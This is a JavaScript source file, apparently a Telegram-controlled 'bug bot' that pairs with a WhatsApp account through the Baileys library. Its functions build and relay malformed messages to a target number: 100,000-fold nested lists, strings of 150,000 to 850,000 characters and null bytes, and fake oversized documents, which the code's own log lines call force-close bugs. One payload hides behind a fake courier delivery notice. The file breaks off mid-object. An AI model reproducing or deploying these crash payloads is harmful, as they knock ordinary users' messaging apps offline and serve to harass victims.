const fs = require('fs');
const { default: makeWASocket, useMultiFileAuthState, downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, generateWAMessageContent, generateWAMessage, makeInMemoryStore, prepareWAMessageMedia, generateWAMessageFromContent, MediaType, areJidsSameUser, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, GroupMetadata, initInMemoryKeyStore, getContentType, MiscMessageGenerationOptions, useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification,MessageTypeProto, WALocationMessage, ReconnectMode, WAContextInfo, proto, WAGroupMetadata, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediaConnInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, WAMediaUpload, mentionedJid, processTime, Browser, MessageType, Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, GroupSettingChange, DisconnectReason, WASocket, getStream, WAProto, isBaileys, AnyMessageContent, fetchLatestBaileysVersion, templateMessage, InteractiveMessage, Header } = require('@whiskeysockets/baileys');
const P = require('pino');
const tdxlol = fs.readFileSync('./storage/tdx.jpeg')
const global = require('./storage/config.js');
const Boom = require('@hapi/boom');
const TelegramBot = require('node-telegram-bot-api');
const bot = new TelegramBot(global.botToken, { polling: true });
const owner = global.owner;
const { requestRegistrationCode } = require('@whiskeysockets/baileys');
const cooldowns = new Map();
const crypto = require("crypto");
const axios = require('axios');
console.log(`<!> SUCCES CONECTION TO SCRIPT`)
let Ren;
let premiumUsers = JSON.parse(fs.readFileSync('./storage/premium.json'));
let adminUsers = JSON.parse(fs.readFileSync('./storage/admin.json'));
let whatsappStatus = false;
           function getGreeting() {
                   const hours = new Date().getHours();
                   if (hours >= 0 && hours < 12) {
                           return "MOTU PATLU 🌆";
                   } else if (hours >= 12 && hours < 18) {
                           return "JAI SHREE RAM 🌇";
                   } else {
                           return "BUG BOT BY MOTU PATLU 🌌";
                   }
           }
           const greeting = getGreeting();
           async function startWhatsapp() {
                   const {
                           state,
                           saveCreds
                   } = await useMultiFileAuthState('Siro');
                   Ren = makeWASocket({
                           auth: state,
                           logger: P({
                                   level: 'silent'
                           }),
                           printQRInTerminal: false,
                   });
                   Ren.ev.on('connection.update', async (update) => {
                           const {
                                   connection,
                                   lastDisconnect
                           } = update;
                           if (connection === 'close') {
                                   const reason = lastDisconnect?.error?.output?.statusCode || lastDisconnect?.reason;
                                   if (reason && reason >= 500 && reason < 600 && reason === 428 && reason === 408 && reason === 429) {
                                           whatsappStatus = false;
                                           await getSessions(bot, chatId, number);
                                   } else {
                                           whatsappStatus = false;
                                   }
                           } else if (connection === 'open') {
                                   whatsappStatus = true;
                           }
                   })
           };
           async function getSessions(bot, chatId, number) {
                   const {
                           state,
                           saveCreds
                   } = await useMultiFileAuthState('Siro');
                   Ren = makeWASocket({
                           auth: state,
                           logger: P({
                                   level: 'silent'
                           }),
                           printQRInTerminal: false,
                   });
                   Ren.ev.on('connection.update', async (update) => {
                           const {
                                   connection,
                                   lastDisconnect
                           } = update;
                           if (connection === 'close') {
                                   const reason = lastDisconnect?.error?.output?.statusCode || lastDisconnect?.reason;
                                   if (reason && reason >= 500 && reason < 600) {
                                           whatsappStatus = false;
                                           await bot.sendMessage(chatId, `${number} ⟠ ♛ 𝙈𝙊𝙏𝙐 𝙋𝘼𝙏𝙇𝙐 💜 ♛♛ 𝐂𝐎𝐍𝐍𝐄𝐂𝐓 ⟠`);
                                           await getSessions(bot, chatId, number);
                                   } else {
                                           whatsappStatus = false;
                                           await bot.sendMessage(chatId, `${number} ⟠ ♛ 𝙈𝙊𝙏𝙐 𝙋𝘼𝙏𝙇𝙐 💜 ♛♛ 𝐂𝐎𝐍𝐍𝐄𝐂𝐓 𝐄𝐗𝐏𝐈𝐑𝐄𝐃 ⟠`);
                                           await fs.unlinkSync('./Siro/creds.json');
                                   }
                           } else if (connection === 'open') {
                                   whatsappStatus = true;
                                   bot.sendMessage(chatId, `${number} ⟠ 𝐒𝐔𝐂𝐂𝐄𝐒 𝐂𝐎𝐍𝐍𝐄𝐂𝐓 𝐓𝐎 𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 BY MOTU ⟠`);
                           }
                           if (connection === 'connecting') {
                                   await new Promise(resolve => setTimeout(resolve, 1000));
                                   try {
                                           if (!fs.existsSync('./Siro/creds.json')) {
                                                   const formattedNumber = number.replace(/\D/g, '');
                                                   const pairingCode = await Ren.requestPairingCode(formattedNumber);
                                                   const formattedCode = pairingCode?.match(/.{1,4}/g)?.join('-') || pairingCode;
                                                   bot.sendMessage(chatId, `${number} CODE : ${formattedCode}`);
                                           }
                                   } catch (error) {
                                           bot.sendMessage(chatId, `EROR CODE : ${error.message}`);
                                   }
                           }
                   });
                   Ren.ev.on('creds.update', saveCreds);
           }

           function savePremiumUsers() {
                   fs.writeFileSync('./storage/premium.json', JSON.stringify(premiumUsers, null, 2));
           }

           function saveAdminUsers() {
                   fs.writeFileSync('./storage/admin.json', JSON.stringify(adminUsers, null, 2));
           }

           function watchFile(filePath, updateCallback) {
                   fs.watch(filePath, (eventType) => {
                           if (eventType === 'change') {
                                   try {
                                           const updatedData = JSON.parse(fs.readFileSync(filePath));
                                           updateCallback(updatedData);
                                           console.log(`File ${filePath} updated successfully.`);
                                   } catch (error) {
                                           console.error(`Error updating ${filePath}:`, error.message);
                                   }
                           }
                   });
           }
           watchFile('./storage/premium.json', (data) => (premiumUsers = data));
           watchFile('./storage/admin.json', (data) => (adminUsers = data));
           async function CallPermision(target) {
                   let {
                           generateWAMessageFromContent,
                           proto
                   } = require("@whiskeysockets/baileys")
                   let sections = [];
                   for (let i = 0; i < 100000; i++) {
                           let ThunderVarious = {
                                   title: `Thunder Avalible Strom \"🐉\" ${i}`,
                                   highlight_label: `𝐒𝐢𝐫𝐨 𝐄𝐬𝐂𝐚𝐧𝐨𝐫 ${i}`,
                                   rows: [{
                                           title: "🪐",
                                           id: `id${i}`,
                                           subrows: [{
                                                   title: "𝙼𝙾𝚃𝚄𝙿𝙰𝚃𝙻𝚄𝗧𝗵𝘂𝗻𝗱𝗲𝗿🏷️",
                                                   id: `nested_id1_${i}`,
                                                   subsubrows: [{
                                                           title: "𝗧𝗿𝗮𝘀𝗵𝗙𝗹𝗼𝗮𝘁𝗶𝗻𝗴 -- ©𝐒𝐢𝐫𝐨 𝐄𝐬𝐂𝐚𝐧𝐨𝐫",
                                                           id: `deep_nested_id1_${i}`,
                                                   }, {
                                                           title: "𝗡𝗲𝘀𝘁𝗶𝗴𝗿𝗶𝗹𝘀𝗧𝗿𝗮𝘀𝗵🐉",
                                                           id: `deep_nested_id2_${i}`,
                                                   }, {
                                                           title: "𝗡𝗲𝘀𝘁𝗶𝗴𝗿𝗶𝗹𝘀𝗧𝗿𝗮𝘀𝗵🐉",
                                                           id: `deep_nested_id2_${i}`,
                                                   }, {
                                                           title: "𝗡𝗲𝘀𝘁𝗶𝗴𝗿𝗶𝗹𝘀𝗧𝗿𝗮𝘀𝗵🐉",
                                                           id: `deep_nested_id2_${i}`,
                                                   }, {
                                                           title: "𝗡𝗲𝘀𝘁𝗶𝗴𝗿𝗶𝗹𝘀𝗧𝗿𝗮𝘀𝗵🐉",
                                                           id: `deep_nested_id2_${i}`,
                                                   }, {
                                                           title: "𝗡𝗲𝘀𝘁𝗶𝗴𝗿𝗶𝗹𝘀𝗧𝗿𝗮𝘀𝗵🐉",
                                                           id: `deep_nested_id2_${i}`,
                                                   }, {
                                                           title: "𝗡𝗲𝘀𝘁𝗶𝗴𝗿𝗶𝗹𝘀𝗧𝗿𝗮𝘀𝗵🐉",
                                                           id: `deep_nested_id2_${i}`,
                                                   }, {
                                                           title: "𝗡𝗲𝘀𝘁𝗶𝗴𝗿𝗶𝗹𝘀𝗧𝗿𝗮𝘀𝗵🐉",
                                                           id: `deep_nested_id2_${i}`,
                                                   }, {
                                                           title: "𝗡𝗲𝘀𝘁𝗶𝗴𝗿𝗶𝗹𝘀𝗧𝗿𝗮𝘀𝗵🐉",
                                                           id: `deep_nested_id2_${i}`,
                                                   }],
                                           }, {
                                                   title: "𝗧𝗙𝗢𝗧𝗿𝗮𝘀𝗵〽️",
                                                   id: `nested_id2_${i}`,
                                           }, ],
                                   }, ],
                           };
                           let ButtonOverFlow = {
                                   buttonsMessage: {
                                           documentMessage: {
                                                   url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                                                   mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                                   fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                                                   fileLength: "9999999999999",
                                                   pageCount: 3567587327,
                                                   mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                                                   fileName: "\u0000",
                                                   fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                                                   directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                                                   mediaKeyTimestamp: "1735456100",
                                                   contactVcard: true,
                                                   caption: ""
                                           },
                                           contentText: "🐉 - Xyro Thunder",
                                           footerText: "© 𝐒𝐢𝐫𝐨 𝐄𝐬𝐂𝐚𝐧𝐨𝐫",
                                           buttons: [{
                                                   buttonId: `${i}`,
                                                   buttonText: {
                                                           displayText: "🐉-------Trash Over Flowed"
                                                   },
                                                   type: 1
                                           }],
                                           headerType: 2
                                   }
                           }
                           let TrashDex = {
                                   title: `𝐂𝐫͢𝐚͠𝐬𝐡 𝐎𝐯͠𝐞𝐫͢𝐅𝐥͓𝐨𝐰͠𝐞𝐝️🐉 ${i}`,
                                   highlight_label: `〽️ ${i}️`,
                                   rows: [{
                                           header: "𝐂𝐫͢𝐚͠𝐬𝐡 𝐎𝐯͠𝐞𝐫͢𝐅𝐥͓𝐨𝐰͠𝐞𝐝🐉",
                                           title: "ᨒ",
                                           id: `.allmenu ${i}`
                                   }, {
                                           header: `𝐂𝐫͢𝐚͠𝐬𝐡 𝐎𝐯͠𝐞𝐫͢𝐅𝐥͓𝐨𝐰͠𝐞𝐝️🐉 ${i}`,
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫͢𝐚͠𝐬𝐡 𝐎𝐯͠𝐞𝐫͢𝐅𝐥͓𝐨𝐰͠𝐞𝐝🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: `𝐂𝐫͢𝐚͠𝐬𝐡 𝐎𝐯͠𝐞𝐫͢𝐅𝐥͓𝐨𝐰͠𝐞𝐝️🐉 ${i}`,
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫͢𝐚͠𝐬𝐡 𝐎𝐯͠𝐞𝐫͢𝐅𝐥͓𝐨𝐰͠𝐞𝐝🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: `𝐂𝐫͢𝐚͠𝐬𝐡 𝐎𝐯͠𝐞𝐫͢𝐅𝐥͓𝐨𝐰͠𝐞𝐝️🐉 ${i}`,
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫͢𝐚͠𝐬𝐡 𝐎𝐯͠𝐞𝐫͢𝐅𝐥͓𝐨𝐰͠𝐞𝐝🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫͢𝐚͠𝐬𝐡 𝐎𝐯͠𝐞𝐫͢𝐅𝐥͓𝐨𝐰͠𝐞𝐝🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫͢𝐚͠𝐬𝐡 𝐎𝐯͠𝐞𝐫͢𝐅𝐥͓𝐨𝐰͠𝐞𝐝🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫͢𝐚͠𝐬𝐡 𝐎𝐯͠𝐞𝐫͢𝐅𝐥͓𝐨𝐰͠𝐞𝐝🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫͢𝐚͠𝐬𝐡 𝐎𝐯͠𝐞𝐫͢𝐅𝐥͓𝐨𝐰͠𝐞𝐝🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫͢𝐚͠𝐬𝐡 𝐎𝐯͠𝐞𝐫͢𝐅𝐥͓𝐨𝐰͠𝐞𝐝🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫͢𝐚͠𝐬𝐡 𝐎𝐯͠𝐞𝐫͢𝐅𝐥͓𝐨𝐰͠𝐞𝐝🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫͢𝐚͠𝐬𝐡 𝐎𝐯͠𝐞𝐫͢𝐅𝐥͓𝐨𝐰͠𝐞𝐝🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫͢𝐚͠𝐬𝐡 𝐎𝐯͠𝐞𝐫͢𝐅𝐥͓𝐨𝐰͠𝐞𝐝🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫͢𝐚͠𝐬𝐡 𝐎𝐯͠𝐞𝐫͢𝐅𝐥͓𝐨𝐰͠𝐞𝐝🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫͢𝐚͠𝐬𝐡 𝐎𝐯͠𝐞𝐫͢𝐅𝐥͓𝐨𝐰͠𝐞𝐝🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫͢𝐚͠𝐬𝐡 𝐎𝐯͠𝐞𝐫͢𝐅𝐥͓𝐨𝐰͠𝐞𝐝🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫͢𝐚͠𝐬𝐡 𝐎𝐯͠𝐞𝐫͢𝐅𝐥͓𝐨𝐰͠𝐞𝐝🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫͢𝐚͠𝐬𝐡 𝐎𝐯͠𝐞𝐫͢𝐅𝐥͓𝐨𝐰͠𝐞𝐝🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫͢𝐚͠𝐬𝐡 𝐎𝐯͠𝐞𝐫͢𝐅𝐥͓𝐨𝐰͠𝐞𝐝🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫͢𝐚͠𝐬𝐡 𝐎𝐯͠𝐞𝐫͢𝐅𝐥͓𝐨𝐰͠𝐞𝐝🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫͢𝐚͠𝐬𝐡 𝐎𝐯͠𝐞𝐫͢𝐅𝐥͓𝐨𝐰͠𝐞𝐝🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫͢𝐚͠𝐬𝐡 𝐎𝐯͠𝐞𝐫͢𝐅𝐥͓𝐨𝐰͠𝐞𝐝🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫͢𝐚͠𝐬𝐡 𝐎𝐯͠𝐞𝐫͢𝐅𝐥͓𝐨𝐰͠𝐞𝐝🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫͢𝐚͠𝐬𝐡 𝐎𝐯͠𝐞𝐫͢𝐅𝐥͓𝐨𝐰͠𝐞𝐝🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫͢𝐚͠𝐬𝐡 𝐎𝐯͠𝐞𝐫͢𝐅𝐥͓𝐨𝐰͠𝐞𝐝🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫͢𝐚͠𝐬𝐡 𝐎𝐯͠𝐞𝐫͢𝐅𝐥͓𝐨𝐰͠𝐞𝐝🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫͢𝐚͠𝐬𝐡 𝐎𝐯͠𝐞𝐫͢𝐅𝐥͓𝐨𝐰͠𝐞𝐝🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫͢𝐚͠𝐬𝐡 𝐎𝐯͠𝐞𝐫͢𝐅𝐥͓𝐨𝐰͠𝐞𝐝🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫͢𝐚͠𝐬𝐡 𝐎𝐯͠𝐞𝐫͢𝐅𝐥͓𝐨𝐰͠𝐞𝐝🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }]
                           }
                           sections.push(ThunderVarious, TrashDex, ButtonOverFlow);
                   }
                   let listMessage = {
                           title: "𝐒͢𝐢𝐫͠𝐨 𝐄𝐬͓𝐂͢𝐚𝐧͠𝐨𝐫〽️",
                           sections: sections,
                   };
                   let msg = generateWAMessageFromContent(target, {
                           viewOnceMessage: {
                                   message: {
                                           messageContextInfo: {
                                                   deviceListMetadata: {},
                                                   deviceListMetadataVersion: 2,
                                           },
                                           interactiveMessage: proto.Message.InteractiveMessage.create({
                                                   contextInfo: {
                                                           mentionedJid: [],
                                                           isForwarded: true,
                                                           forwardingScore: 999,
                                                           businessMessageForwardInfo: {
                                                                   businessOwnerJid: target,
                                                           },
                                                   },
                                                   body: proto.Message.InteractiveMessage.Body.create({
                                                           text: "\u0000",
                                                   }),
                                                   footer: proto.Message.InteractiveMessage.Footer.create({
                                                           buttonParamsJson: "JSON.stringify(listMessage)",
                                                   }),
                                                   header: proto.Message.InteractiveMessage.Header.create({
                                                           buttonParamsJson: "JSON.stringify(listMessage)",
                                                           subtitle: "Testing Immediate Force Close",
                                                           hasMediaAttachment: false,
                                                   }),
                                                   nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                                           buttons: [{
                                                                   name: "single_select",
                                                                   buttonParamsJson: "JSON.stringify(listMessage)",
                                                           }, {
                                                                   name: "payment_method",
                                                                   buttonParamsJson: "{}",
                                                           }, {
                                                                   name: "call_permission_request",
                                                                   buttonParamsJson: "{}",
                                                           }, {
                                                                   name: "single_select",
                                                                   buttonParamsJson: "JSON.stringify(listMessage)",
                                                           }, {
                                                                   name: "mpm",
                                                                   buttonParamsJson: "JSON.stringify(listMessage)",
                                                           }, {
                                                                   name: "mpm",
                                                                   buttonParamsJson: "JSON.stringify(listMessage)",
                                                           }, {
                                                                   name: "mpm",
                                                                   buttonParamsJson: "JSON.stringify(listMessage)",
                                                           }, {
                                                                   name: "mpm",
                                                                   buttonParamsJson: "{}",
                                                           }, {
                                                                   name: "mpm",
                                                                   buttonParamsJson: "{}",
                                                           }, {
                                                                   name: "mpm",
                                                                   buttonParamsJson: "{}",
                                                           }, {
                                                                   name: "mpm",
                                                                   buttonParamsJson: "{}",
                                                           }, {
                                                                   name: "mpm",
                                                                   buttonParamsJson: "{}",
                                                           }, {
                                                                   name: "call_permission_request",
                                                                   buttonParamsJson: "{}",
                                                           }, {
                                                                   name: "call_permission_request",
                                                                   buttonParamsJson: "{}",
                                                           }, {
                                                                   name: "call_permission_request",
                                                                   buttonParamsJson: "{}",
                                                           }, {
                                                                   name: "mpm",
                                                                   buttonParamsJson: "{}",
                                                           }, {
                                                                   name: "mpm",
                                                                   buttonParamsJson: "{}",
                                                           }, {
                                                                   name: "mpm",
                                                                   buttonParamsJson: "{}",
                                                           }, {
                                                                   name: "mpm",
                                                                   buttonParamsJson: "JSON.stringify(listMessage)",
                                                           }, {
                                                                   name: "mpm",
                                                                   buttonParamsJson: "JSON.stringify(listMessage)",
                                                           }, {
                                                                   name: "mpm",
                                                                   buttonParamsJson: "JSON.stringify(listMessage)",
                                                           }, {
                                                                   name: "mpm",
                                                                   buttonParamsJson: "{}",
                                                           }, {
                                                                   name: "mpm",
                                                                   buttonParamsJson: "{}",
                                                           }, {
                                                                   name: "mpm",
                                                                   buttonParamsJson: "{}",
                                                           }, {
                                                                   name: "mpm",
                                                                   buttonParamsJson: "JSON.stringify(listMessage)",
                                                           }, {
                                                                   name: "mpm",
                                                                   buttonParamsJson: "JSON.stringify(listMessage)",
                                                           }, {
                                                                   name: "mpm",
                                                                   buttonParamsJson: "JSON.stringify(listMessage)",
                                                           }, {
                                                                   name: "call_permission_request",
                                                                   buttonParamsJson: "{}",
                                                           }, {
                                                                   name: "call_permission_request",
                                                                   buttonParamsJson: "{}",
                                                           }, {
                                                                   name: "mpm",
                                                                   buttonParamsJson: "{}",
                                                           }, {
                                                                   name: "mpm",
                                                                   buttonParamsJson: "{}",
                                                           }, {
                                                                   name: "mpm",
                                                                   buttonParamsJson: "{}",
                                                           }],
                                                   }),
                                           }),
                                   },
                           },
                   }, {
                           userJid: target
                   });
                   await Ren.relayMessage(target, msg.message, {
                           participant: {
                                   jid: target,
                           },
                   });
                   console.log("Send Bug By SiroEsCanor🐉");
           }
           async function LocationUi(target) {
                   await Ren.relayMessage(target, {
                           groupMentionedMessage: {
                                   message: {
                                           interactiveMessage: {
                                                   header: {
                                                           locationMessage: {
                                                                   degreesLatitude: 111,
                                                                   degreesLongitude: 111
                                                           },
                                                           hasMediaAttachment: true
                                                   },
                                                   body: {
                                                           text: "\u0000" + "ꦿꦸ".repeat(150000) + "@1".repeat(70000),
                                                   },
                                                   nativeFlowMessage: {
                                                           messageParamsJson: "🛒드림 -- Vyross"
                                                   },
                                                   contextInfo: {
                                                           mentionedJid: Array.from({
                                                                   length: 5
                                                           }, () => "1@newsletter"),
                                                           groupMentions: [{
                                                                   groupJid: "1@newsletter",
                                                                   groupSubject: "🛒드림 -- Vyross"
                                                           }],
                                                           quotedMessage: {
                                                                   documentMessage: {
                                                                           contactVcard: true
                                                                   }
                                                           }
                                                   }
                                           }
                                   }
                           }
                   }, {
                           participant: {
                                   jid: target
                           }
                   });
                   console.log("Send Bug By SiroEsCanor🐉");
           }
           async function DocumentUi(target) {
                   await Ren.relayMessage(target, {
                           groupMentionedMessage: {
                                   message: {
                                           interactiveMessage: {
                                                   header: {
                                                           documentMessage: {
                                                                   url: "https://mmg.whatsapp.net/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0&mms3=true",
                                                                   mimetype: "application/pdf",
                                                                   fileSha256: "cZMerKZPh6fg4lyBttYoehUH1L8sFUhbPFLJ5XgV69g=",
                                                                   fileLength: "1099511627776",
                                                                   pageCount: 199183729199991,
                                                                   mediaKey: "eKiOcej1Be4JMjWvKXXsJq/mepEA0JSyE0O3HyvwnLM=",
                                                                   fileName: "🛒드림 || 𝑪𝒓𝒂𝒔𝒉 𝑿𝒚𝒓𝒐 - 𝑻𝒉𝒖𝒏𝒅𝒆𝒓𝑿 ✨",
                                                                   fileEncSha256: "6AdQdzdDBsRndPWKB5V5TX7TA5nnhJc7eD+zwVkoPkc=",
                                                                   directPath: "/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0",
                                                                   mediaKeyTimestamp: "1728631701",
                                                                   contactVcard: true
                                                           },
                                                           hasMediaAttachment: true
                                                   },
                                                   body: {
                                                           text: "\u0000" + "ꦿꦸ".repeat(1) + "@1".repeat(1),
                                                   },
                                                   nativeFlowMessage: {
                                                           messageParamsJson: "🛒드림 -- Vyross",
                                                           "buttons": [{
                                                                   "name": "review_and_pay",
                                                                   "buttonParamsJson": "{\"currency\":\"IDR\",\"total_amount\":{\"value\":2000000,\"offset\":100},\"reference_id\":\"4R0F79457Q7\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"PAYMENT_REQUEST\",\"items\":[{\"retailer_id\":\"custom-item-8e93f147-12f5-45fa-b903-6fa5777bd7de\",\"name\":\"sksksksksksksks\",\"amount\":{\"value\":2000000,\"offset\":100},\"quantity\":1}]},\"additional_note\":\"sksksksksksksks\",\"native_payment_methods\":[],\"share_payment_status\":false}"
                                                           }]
                                                   },
                                                   contextInfo: {
                                                           mentionedJid: Array.from({
                                                                   length: 5
                                                           }, () => "1@newsletter"),
                                                           groupMentions: [{
                                                                   groupJid: "1@newsletter",
                                                                   groupSubject: "🛒드림 -- Vyross"
                                                           }]
                                                   }
                                           }
                                   }
                           }
                   }, {
                           participant: {
                                   jid: target
                           }
                   });
                   console.log("Send Bug By SiroEsCanor🐉");
           }
           async function CrashButton(target) {
                   let IphoneCrash = "\u0000".repeat(45000)
                   const stanza = [{
                           attrs: {
                                   biz_bot: '1'
                           },
                           tag: "bot",
                   }, {
                           attrs: {},
                           tag: "biz",
                   }, ];
                   let messagePayload = {
                           viewOnceMessage: {
                                   message: {
                                           locationMessage: {
                                                   degreesLatitude: 11.11,
                                                   degreesLongitude: -11.11,
                                                   name: `Halo Mas kami dari J&T Express akan melakukan proses delivery paket COD dengan nomor waybillzz JX3272026054 ke alamat anda , SEMARANG JAWA TENGAH , mohon kesediaannya untuk memastikan apakah anda benar memesan barang COD senilai Rp 301,990？Terima kasih`,
                                                   url: "https://youtube.com/@akhiroc-nine",
                                                   contextInfo: {
                                                           participant: "0@s.whatsapp.net",
                                                           remoteJid: "status@broadcast",
                                                           quotedMessage: {
                                                                   buttonsMessage: {
                                                                           documentMessage: {
                                                                                   url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                                                                                   mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                                                                   fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                                                                                   fileLength: "9999999999999",
                                                                                   pageCount: 3567587327,
                                                                                   mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                                                                                   fileName: "\u0000",
                                                                                   fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                                                                                   directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                                                                                   mediaKeyTimestamp: "1735456100",
                                                                                   contactVcard: true,
                                                                                   caption: "sebuah kata maaf takkan membunuhmu, rasa takut bisa kau hadapi"
                                                                           },
                                                                           contentText: "\u0000",
                                                                           footerText: "© Siro EsCanor",
                                                                           buttons: [{
                                                                                   buttonId: "\u0000".repeat(850000),
                                                                                   buttonText: {
                                                                                           displayText: "yeee"
                                                                                   },
                                                                                   type: 1
                                                                           }],
                                                                           headerType: 3
                                                                   }
                                                           },
                                                           conversionSource: "porn",
                                                           conversionData: crypto.randomBytes(16),
                                                           conversionDelaySeconds: 0,
                                                           forwardingScore: 999999,
                                                           isForwarded: true,
                                                           quotedAd: {
                                                                   advertiserName: " x ",
                                                                   mediaType: "IMAGE",
                                                                   jpegThumbnail: tdxlol,
                                                                   caption: " x "
                                                           },
                                                           placeholderKey: {
                                                                   remoteJid: "0@s.whatsapp.net",
                                                                   fromMe: false,
                                                                   id: "ABCDEF1234567890"
                                                           },
                                                           expiration: -99999,
                                                           ephemeralSettingTimestamp: Date.now(),
                                                           ephemeralSharedSecret: crypto.randomBytes(16),
                                                           entryPointConversionSource: "kontols",
                                                           entryPointConversionApp: "kontols",
                                                           actionLink: {
                                                                   url: "t.me/MOTU_PATALU_HINDU_HAI",
                                                                   buttonTitle: "konstol"
                                                           },
                                                           disappearingMode: {
                                                                   initiator: 1,
                                                                   trigger: 2,
                                                                   initiatorDeviceJid: target,
                                                                   initiatedByMe: true
                                                           },
                                                           groupSubject: "kontol",
                                                           parentGroupJid: "kontolll",
                                                           trustBannerType: "kontol",
                                                           trustBannerAction: 99999,
                                                           isSampled: true,
                                                           externalAdReply: {
                                                                   title: "\u0000",
                                                                   mediaType: 2,
                                                                   renderLargerThumbnail: true,
                                                                   showAdAttribution: true,
                                                                   containsAutoReply: true,
                                                                   body: "Siro EsCanor",
                                                                   thumbnailUrl: "https://files.catbox.moe/asx3vo.jpg",
                                                                   sourceUrl: "go fuck yourself",
                                                                   sourceId: "dvx - problem",
                                                                   ctwaClid: "cta",
                                                                   ref: "ref",
                                                                   clickToWhatsappCall: true,
                                                                   automatedGreetingMessageShown: false,
